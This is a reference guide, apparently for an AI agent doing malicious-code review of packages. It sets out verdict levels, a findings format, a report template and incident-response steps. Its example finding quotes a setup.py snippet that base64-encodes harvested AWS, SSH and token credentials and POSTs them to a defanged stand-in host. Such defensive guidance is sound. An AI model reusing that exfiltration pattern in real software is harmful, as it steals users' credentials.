# Report

The report a user acts on: a verdict and coverage they can decide on in the first lines, findings that each prove one harmful behavior, and every limit stated.

## Contents

- [Verdict scale](#verdict-scale)
- [Coverage and disposition](#coverage-and-disposition)
- [Findings](#findings)
- [Template](#template)
- [Example finding](#example-finding)
- [When the target already ran](#when-the-target-already-ran)

## Verdict scale

There is no "safe" verdict.

| Verdict | Threshold |
|---|---|
| **Malicious behavior established** | Code that does covert or unauthorized harm is quoted and traced, or OSV returns a `MAL-` record for the exact package version. Say which basis applies. |
| **Strong indicators of malicious behavior** | A harmful behavior chain is traced, but one link is unresolved (an undecoded payload, a remote second stage, a trigger condition). |
| **Suspicious behavior requiring explanation** | Concrete concerning behavior with a plausible legitimate explanation the evidence does not rule out. |
| **No malicious indicators identified in inspected scope** | Every execution surface was reviewed and nothing supported a finding. It says nothing about unreviewed artifacts, dependencies or future versions. |
| **Insufficient evidence** | Missing artifacts, failed checks, or unreviewed execution surfaces or opaque blobs prevent a useful verdict. |

Use the highest verdict any one finding supports.
A finding stands even when coverage is partial; a partial review with no findings is *Insufficient evidence*, not the no-indicators verdict.

Severity, confidence and intent are separate: severity is the impact if the chain runs, confidence is how well the code supports the chain (high, medium, low, each with a reason), and intent may stay unknown even when the effect is clearly harmful.

## Coverage and disposition

- **Coverage**: *complete* (every file the inventory lists as an execution surface or flagged was reviewed in full), *partial* (name what was not), or *blocked* (acquisition, staging or the reviewer failed).
- **Disposition**: *reject* (do not install; remove if present), *hold* (do not install until the named gap is closed), *escalate* (security team or incident process), or *proceed with existing controls* (only with the no-indicators verdict and complete coverage).

## Findings

One finding per behavior chain, never one per matched line: forty `base64` hits that feed one `exec` are one finding.

Each finding carries:

- `F<n>` · severity · confidence · `path:line` (staged path; byte offset for binaries).
- **Behavior**: trigger → data or capability → action → destination or affected resource, with the prerequisites and the impact. A destination may be a local file, a process, an order or an account, not only a host.
- **Evidence**: the few lines that show it, secrets replaced with `<redacted>`, URLs and hosts defanged (`hxxps://host[.]tld`). Mark what was read in the code and what is inferred.
- **Benign reading considered**: only when one is plausible, and why it fails or still stands.
- **Action**: what the user should do about this finding.

Leave out ruled-out concerns unless the explanation prevents a likely misreading, such as an install hook that only compiles a documented native extension.

## Template

```markdown
## Malicious-code review: <target identity>

**Verdict:** <verdict> (<basis>) · **Coverage:** <complete|partial|blocked> · **Disposition:** <disposition>
Static analysis only; the target was not executed. <One sentence: the strongest evidence.>

**Target:** <commit, or package version with artifact file names and SHA-256>; baseline <version or commit, or none>.

### Findings

<findings, most severe first, or "None supported by the reviewed code.">

### Known-malicious and advisory lookups

<OSV MAL- results and advisories, or why no lookup was made>

### Gaps

<every unreviewed surface, undecoded blob, unreviewed dependency, failed or skipped step, and what would close it>

### Evidence

`$WORK` (<path>): provenance.jsonl, stage-*.json, inventory.md, deps.md, manifest.tsv, staged files. It is discarded with the agent session unless copied.
```

Keep the chat report short: full hashes, request records, inventories and the reviewer's complete output stay in the evidence directory, but a failed or skipped step always appears under Gaps.

## Example finding

```markdown
**F1** · Critical · high · `target/pkg-2.3.1/setup.py:41`
**Behavior:** `pip install` runs `setup.py` → `_collect()` reads `~/.aws/credentials`, `~/.ssh/id_*` and every environment variable containing `KEY` or `TOKEN` → base64-encodes them → POSTs to hxxps://telemetry-cdn[.]example/v1 on every install, before `setup()` is reached. Impact: theft of cloud, SSH and exchange credentials from any machine that installs this version; no user action beyond installing.
**Evidence (read):**
    payload = base64.b64encode(json.dumps(_collect()).encode())
    urllib.request.urlopen("hxxps://telemetry-cdn[.]example/v1", data=payload)
**Benign reading considered:** install telemetry; rejected, because it reads credential files, is undocumented and is absent from 2.3.0 (`inventory.md`: `setup.py` changed).
**Action:** reject 2.3.1, pin 2.3.0, and follow the incident steps on any machine where 2.3.1 was installed.
```

## When the target already ran

When the user says the target was installed, built, imported or executed, add an **Incident steps** section scoped to what the findings show it could reach:

1. Isolate the affected machine or container from the network if the payload persists or calls home.
2. Rotate every credential it could read, from a clean machine: cloud keys, SSH keys, `gh` and registry tokens, exchange API keys, and anything in its environment.
3. Check for the persistence the findings name (shell rc files, crontab, systemd units, `authorized_keys`, `.pth` and `sitecustomize.py` files, git hooks) and for the indicators in the findings.
4. Escalate to the security team with the evidence directory.

Do not perform these steps yourself; hand them to the user.
